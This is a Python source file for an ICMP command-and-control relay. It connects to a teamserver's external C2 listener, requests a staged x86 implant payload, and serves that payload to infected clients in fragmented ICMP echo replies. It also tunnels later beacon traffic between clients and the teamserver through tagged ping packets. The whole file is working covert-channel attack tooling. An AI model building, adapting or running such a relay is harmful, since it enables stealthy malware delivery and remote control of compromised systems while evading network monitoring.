import socket
import struct
from scapy.all import sniff, send, IP, ICMP, Raw
import math
import uuid

# === Constants ===
ICMP_TAG = "RQ47"
PAYLOAD_MAX_SIZE = 512 * 1024
BUFFER_MAX_SIZE = 1024 * 1024
MAX_ICMP_CHUNK_SIZE = 1400

class ICMP_C2_Handler:
    def __init__(self, ip: str, port: int):
        self.server_ip = ip
        self.server_port = port
        self.sock = None

    def socket_setup(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.sock.connect((self.server_ip, self.server_port))
            print(f"[+] Connected to TeamServer at {self.server_ip}:{self.server_port}")
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            self.sock.close()
            self.sock = None

        # apparently need to do setup right after connecting
        self.send_frame(b"arch=x86")
        self.send_frame(b"pipename=foobar")
        self.send_frame(b"block=100")
        self.send_frame(b"go")
        self.payload = self.recv_frame()

    def recv_frame(self):
        raw_size = self.sock.recv(4)
        print(f"TeamServer: {raw_size}")
        if len(raw_size) < 4:
            raise ConnectionError("Failed to receive frame size.")
        size = struct.unpack('<I', raw_size)[0]

        buffer = b''
        while len(buffer) < size:
            chunk = self.sock.recv(size - len(buffer))
            if not chunk:
                raise ConnectionError("Socket closed before full frame received.")
            buffer += chunk

        return buffer

    def send_frame(self, data: bytes):
        size = len(data)
        self.sock.sendall(struct.pack('<I', size))
        self.sock.sendall(data)

    def handle_icmp(self, packet):
        if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw) and packet[Raw].load.startswith(ICMP_TAG.encode()):
            try:
                print(f"[+] Tagged ICMP from {packet[IP].src}: Type={packet[ICMP].type}, Code={packet[ICMP].code}")

                # === Extract useful info ===
                ip_src = packet[IP].src if packet[IP].src else "0.0.0.0"
                print(f"[DEBUG] IP source: {ip_src}")

                ip_dst = packet[IP].dst if packet[IP].dst else "0.0.0.0"
                print(f"[DEBUG] IP destination: {ip_dst}")

                icmp_id = getattr(packet[ICMP], 'id', 1) & 0xFFFF  # Clamp to 16-bit
                print(f"[DEBUG] ICMP ID: {icmp_id}")

                icmp_seq = getattr(packet[ICMP], 'seq', 1) & 0xFFFF  # Clamp to 16-bit
                print(f"[DEBUG] ICMP Sequence: {icmp_seq}")

                # Strip nulls and tag from the raw payload
                icmp_data = packet[Raw].load.rstrip(b'\x00').lstrip(ICMP_TAG.encode())


                # === Handle first-time check-in (local-only logic) ===
                if icmp_data == b"OI GIMME A PAYLOAD":
                    print("[+] Payload going out")
                    # response_payload = ICMP_TAG.encode()  # don't need to add tag cuz the chunking does arleady for us
                    # print(response_payload)
                    # response_payload += self.payload
                    response_payload = self.payload
                    #print(f"[+] Payload contents: {response_payload}")
                    print(f"[+] Payload length: {len(response_payload)}")
                    print("[+] Sending reply to client...")
                    #reply = IP(dst=ip_src, src=ip_dst) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=response_payload)
                    #send(reply, verbose=False)
                    self.send_fragmented_icmp(client_ip=ip_src, client_icmp_id=icmp_id, full_payload=response_payload)
                    print(f"[+] Replied to {ip_src} with C2 payload")

                # === Forward other traffic to TeamServer ===
                else:
                    print(f"Frame going to TeamServer: {icmp_data}")
                    self.send_frame(icmp_data)
                    teamserver_response = self.recv_frame()
                    response_payload = ICMP_TAG.encode()
                    response_payload += teamserver_response
                    print("[+] Sending reply to client...")
                    reply = IP(dst=ip_src, src=ip_dst) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=response_payload)
                    send(reply, verbose=False)
                    print(f"[+] Replied to {ip_src} with C2 payload")

            except Exception as e:
                print(f"[!] Error responding to tagged ICMP: {e}")

    # for large frames/payloads
    def send_icmp_packet(self, ip_dst, icmp_id, icmp_seq, payload, tag=b"RQ47"):
        """
        Always send as an Echo Reply (type 0).
        """
        full_payload = tag + payload
        packet = IP(dst=ip_dst) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=full_payload)
        send(packet, verbose=False)
        print(f"[+] Sent ICMP REPLY seq={icmp_seq}, len={len(full_payload)}")


    # def send_fragmented_icmp(self, ip_dst, icmp_id, full_payload, tag=b"RQ47", chunk_size=500):
    #     # First packet with sequence 0 sends the total size as 4 bytes
    #     total_size = len(full_payload)
    #     size_bytes = total_size.to_bytes(4, "big")
    #     self.send_icmp_packet(ip_dst, icmp_id, 0, size_bytes, tag=tag)

    #     # Then send fragments with seq 1..N
    #     offset = 0
    #     seq = 1
    #     while offset < total_size:
    #         chunk = full_payload[offset:offset + chunk_size]
    #         self.send_icmp_packet(ip_dst, icmp_id, seq, chunk, tag=tag)
    #         offset += chunk_size
    #         seq += 1

    # def send_fragmented_icmp(self, ip_dst, icmp_id, full_payload, tag=b"RQ47"):
    #     # Only raw “payload” here—do NOT pre‐prefix with tag
    #     # Compute how much real data fits per ICMP packet:
    #     chunk_data_size = 500 - len(tag)  # 500 comes from ICMP_PAYLOAD_SIZE in client.c

    #     # 1) Sequence 0: just send the total‐size (4 bytes), letting send_icmp_packet prefix tag
    #     total_size = len(full_payload)
    #     size_bytes = total_size.to_bytes(4, "big")
    #     self.send_icmp_packet(ip_dst, icmp_id, 0, size_bytes, tag=tag)

    #     # 2) Now send “full_payload” in 496-byte slices:
    #     offset = 0
    #     seq = 1
    #     while offset < total_size:
    #         chunk = full_payload[offset : offset + chunk_data_size]
    #         # send_icmp_packet will emit: [TAG (4 bytes)] + chunk
    #         self.send_icmp_packet(ip_dst, icmp_id, seq, chunk, tag=tag)
    #         offset += chunk_data_size
    #         seq += 1

    def wait_for_echo_request(self, expected_src_ip, expected_icmp_id=None):
        """
        Block until we see an ICMP Echo Request (type=8) from expected_src_ip.
        If expected_icmp_id is provided, also match on ICMP.id.
        Returns the full Scapy packet.
        """
        # Build a filter function that checks for:
        #   - IP.src == expected_src_ip
        #   - ICMP.type == 8 (Echo Request)
        #   - optionally ICMP.id == expected_icmp_id
        def _pkt_filter(pkt):
            if IP not in pkt or ICMP not in pkt:
                return False
            if pkt[IP].src != expected_src_ip:
                return False
            if pkt[ICMP].type != 8:  # 8 == Echo Request
                return False
            if expected_icmp_id is not None and pkt[ICMP].id != expected_icmp_id:
                return False
            return True

        # This will block until one packet arrives that passes _pkt_filter
        found = sniff(lfilter=_pkt_filter, count=1, timeout=None)
        if not found:
            return None
        return found[0]  # first (and only) packet

    def send_fragmented_icmp(self, client_ip, client_icmp_id, full_payload, tag=b"RQ47"):
        """
        Fragment 'full_payload' into (500 − len(tag))‐byte chunks,
        but only AFTER blocking until the client sends us a request.
        """
        # First: wait for the client to issue an Echo Request on this ID.
        print(f"[*] Waiting for Echo Request from {client_ip} (ICMP ID={client_icmp_id}) …")
        req_pkt = self.wait_for_echo_request(expected_src_ip=client_ip,
                                             expected_icmp_id=client_icmp_id)
        if req_pkt is None:
            print("[-] Timed out waiting for client request.")
            return

        # Now we've seen the client's check-in. We can respond.
        # 1) Send seq = 0 reply containing total_size (4 bytes)
        total_size  = len(full_payload)
        size_bytes  = total_size.to_bytes(4, "big")
        self.send_icmp_packet(ip_dst=client_ip,
                              icmp_id=client_icmp_id,
                              icmp_seq=0,
                              payload=size_bytes,
                              tag=tag)

        # 2) Send actual data in 496-byte chunks (because ICMP_PAYLOAD_SIZE=500)
        chunk_data_size = 500 - len(tag)
        offset = 0
        seq    = 1
        while offset < total_size:
            chunk = full_payload[offset : offset + chunk_data_size]
            self.send_icmp_packet(ip_dst=client_ip,
                                  icmp_id=client_icmp_id,
                                  icmp_seq=seq,
                                  payload=chunk,
                                  tag=tag)
            offset += chunk_data_size
            seq    += 1

    def go(self):
        print("[+] Attempting to connect to TeamServer External C2 Listener")
        self.socket_setup()
        if not self.sock:
            return

        print("[+] Starting ICMP sniffer...")
        sniff(filter="icmp", prn=self.handle_icmp, store=0)


if __name__ == "__main__":
    c2 = ICMP_C2_Handler(ip="10.10.10.21", port=2222)
    c2.go()